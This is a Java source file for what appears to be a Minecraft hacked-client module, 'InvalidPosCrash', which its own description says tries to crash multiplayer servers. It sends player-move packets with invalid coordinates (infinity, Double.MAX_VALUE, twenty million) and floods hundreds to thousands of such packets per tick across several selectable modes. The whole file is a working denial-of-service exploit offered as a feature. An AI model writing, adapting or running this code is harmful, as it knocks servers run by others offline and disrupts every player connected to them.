package me.dustin.crash.feature;

import me.dustin.crash.CrashPlugin;
import me.dustin.events.core.EventListener;
import me.dustin.events.core.annotate.EventPointer;
import me.dustin.jex.event.filters.PlayerPacketsFilter;
import me.dustin.jex.event.filters.TickFilter;
import me.dustin.jex.event.misc.EventTick;
import me.dustin.jex.event.player.EventMove;
import me.dustin.jex.event.player.EventPlayerPackets;
import me.dustin.jex.feature.mod.core.Feature;
import me.dustin.jex.feature.property.Property;
import me.dustin.jex.helper.misc.Wrapper;
import me.dustin.jex.helper.network.NetworkHelper;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;

public class InvalidPosCrash extends Feature {

    public final Property<PosMode> modeProperty = new Property.PropertyBuilder<PosMode>(this.getClass())
            .name("Mode")
            .value(PosMode.TWENTY_MILLION)
            .build();
    public final Property<Integer> packetCountProperty = new Property.PropertyBuilder<Integer>(this.getClass())
            .name("Packet Count")
            .value(500)
            .min(1)
            .max(10000)
            .inc(10)
            .build();
    public final Property<Boolean> autoDisableProperty = new Property.PropertyBuilder<Boolean>(this.getClass())
            .name("Auto Disable")
            .value(true)
            .build();

    private boolean switchBl = false;
    public InvalidPosCrash() {
        super(CrashPlugin.CRASH, "Attempts to crash the server by sending invalid position packets. (may freeze or kick you)");
    }

    @Override
    public void onEnable() {
        if (Wrapper.INSTANCE.getWorld() != null && Wrapper.INSTANCE.getLocalPlayer() != null) {
            switch(modeProperty.value()) {
                case TWENTY_MILLION -> {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(20000000, 255, 20000000, true));
                    setState(false);
                }
                case INFINITY -> {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, true));
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                    setState(false);
                }
                case TP -> {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, true));
                }
            }
        }
        super.onEnable();
    }

    @EventPointer
    private final EventListener<EventPlayerPackets> eventPlayerPacketsEventListener = new EventListener<>(eventPlayerPackets -> {
        switch (modeProperty.value()) {
            case TP -> {
                for (double i = 0; i < packetCountProperty.value(); i++) {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Wrapper.INSTANCE.getLocalPlayer().getY() + (i * 9), Wrapper.INSTANCE.getLocalPlayer().getZ(), true));
                }
                for (double i = 0; i < packetCountProperty.value() * 10; i++) {
                    NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Wrapper.INSTANCE.getLocalPlayer().getY() + (i * packetCountProperty.value()), Wrapper.INSTANCE.getLocalPlayer().getZ() + (i * 9), true));
                }
            }
            case VELT -> {
                if (Wrapper.INSTANCE.getLocalPlayer().age < 100) {
                    for (int i = 0; i < packetCountProperty.value(); i++) {
                        NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Wrapper.INSTANCE.getLocalPlayer().getY() - 1.0D, Wrapper.INSTANCE.getLocalPlayer().getZ(), false));
                        NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Double.MAX_VALUE, Wrapper.INSTANCE.getLocalPlayer().getZ(), false));
                        NetworkHelper.INSTANCE.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(Wrapper.INSTANCE.getLocalPlayer().getX(), Wrapper.INSTANCE.getLocalPlayer().getY() - 1.0D, Wrapper.INSTANCE.getLocalPlayer().getZ(), false));
                    }
                }
            }
        }
    }, new PlayerPacketsFilter(EventPlayerPackets.Mode.PRE));

    @EventPointer
    private final EventListener<EventMove> eventMoveEventListener = new EventListener<>(eventMove -> {
       if (modeProperty.value() == PosMode.SWITCH) {
           if (switchBl) {
               eventMove.setX(Double.MIN_VALUE);
               eventMove.setZ(Double.MIN_VALUE);
               switchBl = false;
           }
           else {
               eventMove.setX(Double.MAX_VALUE);
               eventMove.setZ(Double.MAX_VALUE);
               switchBl = true;
           }
       }
    });

    @EventPointer
    private final EventListener<EventTick> eventTickEventListener = new EventListener<>(eventTick -> {
        if (Wrapper.INSTANCE.getWorld() == null || Wrapper.INSTANCE.getLocalPlayer() == null && autoDisableProperty.value())
            setState(false);
    }, new TickFilter(EventTick.Mode.PRE));

    public enum PosMode {
        TWENTY_MILLION, INFINITY, TP, VELT, SWITCH
    }
}
